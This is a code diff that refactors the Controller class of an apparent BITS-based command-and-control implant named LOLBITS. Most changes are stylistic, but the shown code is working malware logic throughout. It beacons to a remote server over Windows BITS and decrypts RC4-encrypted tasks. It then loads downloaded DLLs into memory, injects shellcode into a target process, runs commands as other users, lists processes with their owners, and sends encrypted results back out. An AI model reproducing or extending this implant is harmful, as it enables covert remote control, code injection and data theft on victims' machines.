@@ -26,20 +26,13 @@ namespace LOLBITS.Controlling
 
         public Controller(string id, string url,string password)
         {
-            this._id = id;
+            _id = id;
             _p = password;
             _jobsManager = new Jobs(url);
             _sysCall = new SysCallManager();
             _tokenManager = new TokenManager(_sysCall);
 
-            if (Environment.GetEnvironmentVariable("temp") != null)
-            {
-                _tempPath = Environment.GetEnvironmentVariable("temp");
-            }
-            else
-            {
-                _tempPath = @"C:\Windows\Temp\";
-            }
+            _tempPath = Environment.GetEnvironmentVariable("temp") ?? @"C:\Windows\Temp\";
         }
 
         public string GetPassword()
@@ -49,28 +42,28 @@ namespace LOLBITS.Controlling
 
         public void Start()
         {
-            string startBits = "sc start BITS";
+            const string startBits = "sc start BITS";
             Utils.ExecuteCommand(startBits);
             Thread.Sleep(500);
-            string filePath = _tempPath + @"\" + _id;
+            var filePath = _tempPath + @"\" + _id;
 
-            if (TryInitialCon(filePath))
-            {
-                Content file = GetEncryptedFileContent(filePath, out var unused);
-                _id = file.NextId;
-                _auth = file.NextAuth;
-                _restoreKeys = file.Commands; 
-                string domain = Environment.GetEnvironmentVariable("userdomain");
-                string user = Environment.GetEnvironmentVariable("username");
-                Response response = new Response(domain + @"\" + user, _auth);
-                filePath = _tempPath + @"\" + _id + ".txt";
-                EncryptResponseIntoFile(filePath, response);
+            if (!TryInitialCon(filePath)) return;
 
-                _jobsManager.Send(_id, filePath);
+            var file = GetEncryptedFileContent(filePath, out var unused);
+            _id = file.NextId;
+            _auth = file.NextAuth;
+            _restoreKeys = file.Commands; 
+            var domain = Environment.GetEnvironmentVariable("userdomain");
+            var user = Environment.GetEnvironmentVariable("username");
+            var response = new Response(domain + @"\" + user, _auth);
+            filePath = _tempPath + @"\" + _id + ".txt";
+            EncryptResponseIntoFile(filePath, response);
 
-                Loop();
+            _jobsManager.Send(_id, filePath);
+
+            Loop();
                 
-                /*Rectangle bounds = Screen.GetBounds(Point.Empty);
+            /*Rectangle bounds = Screen.GetBounds(Point.Empty);
                 using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                 {
                     using (Graphics g = Graphics.FromImage(bitmap))
@@ -79,23 +72,22 @@ namespace LOLBITS.Controlling
                     }
                     bitmap.Save(@"c:\users\pccom\desktop\test.jpg", ImageFormat.Jpeg);
                 }*/
-            }
         }
 
         private void Loop()
         {
-            bool exit = false;
-            string filePath, headers;
+            var exit = false;
 
             while (!exit)
             {
-                filePath = _tempPath + @"\" + _id;
+                var filePath = _tempPath + @"\" + _id;
+                var headers = "reqId: " + _auth;
 
-                headers = "reqId: " + _auth;
                 Console.WriteLine("next: " + _id);
+
                 if (_jobsManager.Get(_id, filePath, headers, BITS4.BG_JOB_PRIORITY.BG_JOB_PRIORITY_NORMAL))
                 {
-                    Content file = GetEncryptedFileContent(filePath, out var unused);
+                    var file = GetEncryptedFileContent(filePath, out var unused);
 
                     _id = file.NextId;
                     _auth = file.NextAuth;
@@ -122,7 +114,7 @@ namespace LOLBITS.Controlling
 
         private void DoSomething(Content file)
         {
-            string rps = "";
+            var rps = "";
 
             try
             {
@@ -130,32 +122,32 @@ namespace LOLBITS.Controlling
                 {
                     case "inject_dll":
                         {
-                            string fileP = _tempPath + @"\" + _id;
-                            string headers = "reqId: " + _auth + "\r\ncontid: " + ContId;
+                            var fileP = _tempPath + @"\" + _id;
+                            var headers = "reqId: " + _auth + "\r\ncontid: " + ContId;
 
                             if (_jobsManager.Get(_id, fileP, headers, BITS4.BG_JOB_PRIORITY.BG_JOB_PRIORITY_FOREGROUND))
                             {
                                 try
                                 {
-                                    Assembly dll = LoadDll(fileP);
-                                    string method = file.Commands[1];
-                                    string args = "";
+                                    var dll = LoadDll(fileP);
+                                    var method = file.Commands[1];
+                                    var args = "";
 
-                                    for (int i = 2; i < file.Commands.Length; i++)
+                                    for (var i = 2; i < file.Commands.Length; i++)
                                     {
                                         args += file.Commands[i];
                                         if (i < file.Commands.Length)
                                             args += " ";
                                     }
 
-                                    string[] arguments = new string[] { args };
+                                    var arguments = new string[] { args };
 
                                     LauncherDll.Main(method, arguments, dll);
                                     rps = "Dll injected!";
                                 }
                                 catch (Exception)
                                 {
-                                    rps = "ERR:Fatal error ocurred while trying to inject the dll.\n";
+                                    rps = "ERR:Fatal error occurred while trying to inject the dll.\n";
                                 }
                             }
                             else
@@ -168,9 +160,9 @@ namespace LOLBITS.Controlling
 
                     case "inject_shellcode":
                         {
-                            string fileP = _tempPath + @"\" + _id;
-                            string headers = "reqId: " + _auth + "\r\ncontid: " + ContId;
-                            int pid = -1;
+                            var fileP = _tempPath + @"\" + _id;
+                            var headers = "reqId: " + _auth + "\r\ncontid: " + ContId;
+                            var pid = -1;
                             if (file.Commands.Length >= 2)
                                 pid = int.Parse(file.Commands[1]);
 
@@ -186,7 +178,7 @@ namespace LOLBITS.Controlling
                                 }
                                 catch (Exception)
                                 {
-                                    rps = "ERR:Fatal error ocurred while trying to inject shellCode.\n";
+                                    rps = "ERR:Fatal error occurred while trying to inject shellCode.\n";
                                 }
                             }
                             else
@@ -216,8 +208,8 @@ namespace LOLBITS.Controlling
 
                     case "send":
                         {
-                            string fileP = _tempPath + @"\" + _id;
-                            string headers = "reqId: " + _auth + "\r\ncontid: " + ContId;
+                            var fileP = _tempPath + @"\" + _id;
+                            var headers = "reqId: " + _auth + "\r\ncontid: " + ContId;
 
                             if (_jobsManager.Get(_id, fileP, headers, BITS4.BG_JOB_PRIORITY.BG_JOB_PRIORITY_FOREGROUND))
                             {
@@ -269,7 +261,7 @@ namespace LOLBITS.Controlling
                     case "runas":
                         {
                             string user = "", domain = "", password = "";
-                            string[] userData = file.Commands[1].Split('\\');
+                            var userData = file.Commands[1].Split('\\');
 
                             if (userData.Length == 1)
                             {
@@ -330,23 +322,23 @@ namespace LOLBITS.Controlling
                 rps = "ERR: Something went wrong!";
             }
 
-            Response response = new Response(rps, _auth);
-            string filePath = _tempPath + @"\" + _id + ".txt";
+            var response = new Response(rps, _auth);
+            var filePath = _tempPath + @"\" + _id + ".txt";
             EncryptResponseIntoFile(filePath, response);
             TrySend(filePath);
         }
 
-        private string GetProcessInfo()
+        private static string GetProcessInfo()
         {
-            string output = "\n";
-            output = string.Concat(output, string.Format("{0,30}|{1,10}|{2,20}|\n", "NAME", "PID", "ACCOUNT"));
+            var output = "\n";
+            output = string.Concat(output, $"{"NAME",30}|{"PID",10}|{"ACCOUNT",20}|\n");
 
             foreach (var process in Process.GetProcesses())
             {
-                string name = process.ProcessName;
-                int processId = process.Id;
+                var name = process.ProcessName;
+                var processId = process.Id;
 
-                output = string.Concat(output, string.Format("{0,30}|{1,10}|{2,20}|\n", name, processId, GetProcessOwner(processId)));
+                output = string.Concat(output, $"{name,30}|{processId,10}|{GetProcessOwner(processId),20}|\n");
             }
 
             return output;
@@ -354,14 +346,15 @@ namespace LOLBITS.Controlling
 
         private static string GetProcessOwner (int processId)
         {
-            string query = "Select * From Win32_Process Where ProcessID = " + processId;
-            ManagementObjectSearcher moSearcher = new ManagementObjectSearcher(query);
-            ManagementObjectCollection moCollection = moSearcher.Get();
+            var query = "Select * From Win32_Process Where ProcessID = " + processId;
+            var moSearcher = new ManagementObjectSearcher(query);
+            var moCollection = moSearcher.Get();
 
-            foreach (ManagementObject mo in moCollection)
+            foreach (var o in moCollection)
             {
-                string[] args = new string[] { string.Empty };
-                int returnVal = Convert.ToInt32(mo.InvokeMethod("GetOwner", args));
+                var mo = (ManagementObject) o;
+                var args = new string[] { string.Empty };
+                var returnVal = Convert.ToInt32(mo.InvokeMethod("GetOwner", args));
                 if (returnVal == 0)
                     return args[0];
             }
@@ -370,14 +363,13 @@ namespace LOLBITS.Controlling
         }
         private bool TrySend(string filePath)
         {
-            int cont = 0;
+            var cont = 0;
 
             while (cont < 5)
             {
                 if (_jobsManager.Send(_id, filePath))
-                {
                     return true;
-                }
+
                 ++cont;
             }
 
@@ -386,13 +378,12 @@ namespace LOLBITS.Controlling
 
         private bool TryInitialCon(string filePath)
         {
-            int cont = 0;
+            var cont = 0;
             while (cont < 5)
             {
                 if(_jobsManager.Get(_id, filePath, null,BITS4.BG_JOB_PRIORITY.BG_JOB_PRIORITY_NORMAL))
-                {
                     return true;
-                }
+
                 ++cont;
             }
 
@@ -401,31 +392,32 @@ namespace LOLBITS.Controlling
 
         private void EncryptResponseIntoFile(string filePath, Response response)
         {
-            string json_response = JsonConvert.SerializeObject(response);
-            byte[] content_decrypted = Encoding.UTF8.GetBytes(json_response);
-            byte[] xKey = Encoding.ASCII.GetBytes(_p);
-            byte[] content_encrypted = Rc4.Encrypt(xKey, content_decrypted);
-            string hexadecimal = BiteArrayToHex.Convert(content_encrypted);
-            string fileContent = Zipper.Compress(hexadecimal);
+            var jsonResponse = JsonConvert.SerializeObject(response);
+            var contentDecrypted = Encoding.UTF8.GetBytes(jsonResponse);
+            var xKey = Encoding.ASCII.GetBytes(_p);
+            var contentEncrypted = Rc4.Encrypt(xKey, contentDecrypted);
+            var hexadecimal = BiteArrayToHex.Convert(contentEncrypted);
+            var fileContent = Zipper.Compress(hexadecimal);
 
             File.WriteAllText(filePath, fileContent);
         }
 
         private Content GetEncryptedFileContent(string filePath, out byte[] decrypted)
         {
-            string fileStr = File.ReadAllText(filePath);
-            byte[] xKey = Encoding.ASCII.GetBytes(_p);
-            string hexadecimal = Zipper.Decompress(fileStr);
-            byte[] content_encrypted = StringHexToByteArray.Convert(hexadecimal); 
-            byte[] content_decrypted = Rc4.Decrypt(xKey, content_encrypted);
-            decrypted = content_decrypted;
-            string content_encoded = Encoding.UTF8.GetString(content_decrypted);
+            var fileStr = File.ReadAllText(filePath);
+            var xKey = Encoding.ASCII.GetBytes(_p);
+            var hexadecimal = Zipper.Decompress(fileStr);
+            var contentEncrypted = StringHexToByteArray.Convert(hexadecimal); 
+            var contentDecrypted = Rc4.Decrypt(xKey, contentEncrypted);
+
+            decrypted = contentDecrypted;
+
+            var contentEncoded = Encoding.UTF8.GetString(contentDecrypted);
 
             try
             {
-                Content final = JsonConvert.DeserializeObject<Content>(content_encoded);
+                var final = JsonConvert.DeserializeObject<Content>(contentEncoded);
                 return final;
-
             }
             catch
             {
@@ -435,13 +427,13 @@ namespace LOLBITS.Controlling
 
         private Assembly LoadDll(string filePath)
         {
-            string fileStr = File.ReadAllText(filePath);
-            byte[] xKey = Encoding.ASCII.GetBytes(_p);
-            string hexadecimal = Zipper.Decompress(fileStr);
-            byte[] content_encrypted = StringHexToByteArray.Convert(hexadecimal);
-            byte[] content_decrypted = Rc4.Decrypt(xKey, content_encrypted);
+            var fileStr = File.ReadAllText(filePath);
+            var xKey = Encoding.ASCII.GetBytes(_p);
+            var hexadecimal = Zipper.Decompress(fileStr);
+            var contentEncrypted = StringHexToByteArray.Convert(hexadecimal);
+            var contentDecrypted = Rc4.Decrypt(xKey, contentEncrypted);
 
-            Assembly dll = Assembly.Load(content_decrypted);
+            var dll = Assembly.Load(contentDecrypted);
 
             return dll;
         }
